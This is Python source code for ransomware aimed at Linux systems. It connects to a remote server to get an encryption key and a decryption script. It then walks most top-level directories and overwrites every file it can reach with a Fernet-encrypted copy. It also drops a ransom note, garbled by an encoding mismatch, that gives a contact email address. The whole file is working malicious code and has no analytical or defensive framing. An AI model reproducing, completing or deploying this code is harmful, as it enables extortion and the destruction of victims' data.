# coding=gbk
from cryptography.fernet import Fernet
import socket,os,random,time,threading

class Clientencryption():

    def main(self):
        global public_key
        public_key = self.ClientConnect()
        kgloryhacker = open("Kglory�����һ����.txt","a+")
        kgloryhacker.write("������ļ��Ѿ�����������,��������Ҫ��ϵ1956691299@qq.com,��������Ϊ�й�ţ�ƺ͵�ǰĿ¼�µĽ��ܽű�"+str(userrandom)+"����.Ȼ��ȴ��ظ�,�һᷢ�ͽ�����Կ����^^���յ���Կ����Ҫʹ�ý��ܽű�("+str(userrandom)+".py)���н���.")
        kgloryhacker.close()
        drive = self.check_drive()
        self.start(drive)

    def check_folder(self,x):
        for filetype in x:
            try:
                if(os.path.isfile(filetype)):
                    Thread = threading.Thread(target=self.module_combination,args=(os.path.abspath(filetype),))
                    Thread.start()
                elif(os.path.isdir(filetype)):
                    file = os.path.abspath(filetype)
                    files = os.listdir(file)
                    for x in range(len(files)):
                        files[x] = os.path.abspath(file+"/"+files[x])
                    self.check_folder(files)
            except:
                pass
            
    def check_drive(self):
        dictionary = os.popen("ls /").read().strip("\n").split("\n")
        lists = []
        for x in dictionary:
            filecheck = os.path.isdir("/"+x)
            filenames = "/"+x
            if(filecheck and filenames != "/bin" and filenames !="/sbin" and filenames != "/usr" and filenames != "/etc"):
                lists.append("/"+x)
        return lists
    
    def start(self,data):
        for x in data:
            try:
                files = os.listdir(x)
                for j in range(len(files)):
                    files[j] =  x+"/"+files[j]
                Thread = threading.Thread(target=self.check_folder,args=(files,))
                Thread.start()
            except:
                pass
            
    def module_combination(self,filedata):
        cipher = Fernet(public_key)
        if("Kglory.py" in filedata or userrandomfile in filedata or "�����һ����.txt" in filedata):
            pass
        else:
            try:
                fileopen = open(filedata,"rb")
                fileread = fileopen.read()
                encrypted = cipher.encrypt(fileread)
                fileopen.close()
                fileopen = open(filedata,"wb")
                fileopen.write(encrypted)
                fileopen.close()
            except:
                pass
            
    def ClientConnect(self):
        Socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        Socket.connect((str(ip),int(port)))
        global userrandom,userrandomfile
        userrandom = random.randint(100000,999999)
        userrandomfile = str(userrandom)+".py"
        Socket.send(bytes(str(userrandom).encode("UTF-8")))
        while True:
            public_key = Socket.recv(1024)
            decryptedfile = open(str(userrandom)+".py","w+b")
            decryptedfiledata = Socket.recv(3072)
            decryptedfile.write(decryptedfiledata)
            decryptedfile.close()
            return public_key
